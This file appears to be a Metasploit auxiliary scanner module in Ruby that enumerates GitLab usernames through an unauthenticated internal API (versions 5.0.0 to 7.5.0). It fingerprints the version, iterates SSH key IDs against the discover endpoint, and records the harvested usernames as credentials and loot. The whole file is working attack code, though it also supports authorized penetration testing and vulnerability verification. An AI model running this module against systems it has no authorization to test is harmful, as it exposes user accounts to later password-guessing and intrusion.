##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'json'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(
      info,
      'Name'           => 'GitLab User Enumeration',
      'Description'    => "
        The GitLab 'internal' API is exposed unauthenticated on GitLab. This
        allows the username for each SSH Key ID number to be retrieved. Users
        who do not have an SSH Key cannot be enumerated in this fashion. LDAP
        users, e.g. Active Directory users will also be returned. This issue
        was fixed in GitLab v7.5.0 and is present from GitLab v5.0.0.
      ",
      'Author'         => 'Ben Campbell',
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Nov 21 2014',
      'References'     =>
        [
          ['URL', 'https://labs.mwrinfosecurity.com/blog/2015/03/20/gitlab-user-enumeration/']
        ]
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'Path to GitLab instance', '/']),
        OptInt.new('START_ID', [true, 'ID number to start from', 0]),
        OptInt.new('END_ID', [true, 'ID number to enumerate up to', 50])
      ])
  end

  def run_host(_ip)
    internal_api = '/api/v3/internal'
    check = normalize_uri(target_uri.path, internal_api, 'check')

    print_status('Sending GitLab version request...')
    res = send_request_cgi(
        'uri' => check
    )

    if res && res.code == 200 && res.body
      begin
        version = JSON.parse(res.body)
      rescue JSON::ParserError
        fail_with(Failure::Unknown, 'Failed to parse banner version from JSON')
      end

      git_version = version['gitlab_version']
      git_revision = version['gitlab_rev']
      print_good("GitLab version: #{git_version} revision: #{git_revision}")

      service = report_service(
        host: rhost,
        port: rport,
        name: (ssl ? 'https' : 'http'),
        proto: 'tcp'
      )

      report_web_site(
        host: rhost,
        port: rport,
        ssl: ssl,
        info: "GitLab Version - #{git_version}"
      )
    elsif res && res.code == 401
      fail_with(Failure::NotVulnerable, 'Unable to retrieve GitLab version...')
    else
      fail_with(Failure::Unknown, 'Unable to retrieve GitLab version...')
    end

    discover = normalize_uri(target_uri.path, internal_api, 'discover')

    users = ''
    print_status("Enumerating user keys #{datastore['START_ID']}-#{datastore['END_ID']}...")
    datastore['START_ID'].upto(datastore['END_ID']) do |id|
      res = send_request_cgi(
          'uri'       => discover,
          'method'    => 'GET',
          'vars_get'  => { 'key_id' => id }
        )

      if res && res.code == 200 && res.body
        begin
          user = JSON.parse(res.body)
          username = user['username']
          unless username.nil? || username.to_s.empty?
            print_good("Key-ID: #{id} Username: #{username} Name: #{user['name']}")
            store_username(username, res)
            users << "#{username}\n"
          end
        rescue JSON::ParserError
          print_error("Key-ID: #{id} - Unexpected response body: #{res.body}")
        end
      elsif res
        vprint_status("Key-ID: #{id} not found")
      else
        print_error('Connection timed out...')
      end
    end

    unless users.nil? || users.to_s.empty?
      store_userlist(users, service)
    end
  end

  def store_userlist(users, service)
    loot = store_loot('gitlab.users', 'text/plain', rhost, users, nil, 'GitLab Users', service)
    print_good("Userlist stored at #{loot}")
  end

  def store_username(username, res)
    service = ssl ? 'https' : 'http'
    service_data = {
      address: rhost,
      port: rport,
      service_name: service,
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      proof: res
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: username
    }

    credential_data.merge!(service_data)

    # Create the Metasploit::Credential::Core object
    credential_core = create_credential(credential_data)

    # Assemble the options hash for creating the Metasploit::Credential::Login object
    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }

    # Merge in the service data and create our Login
    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end
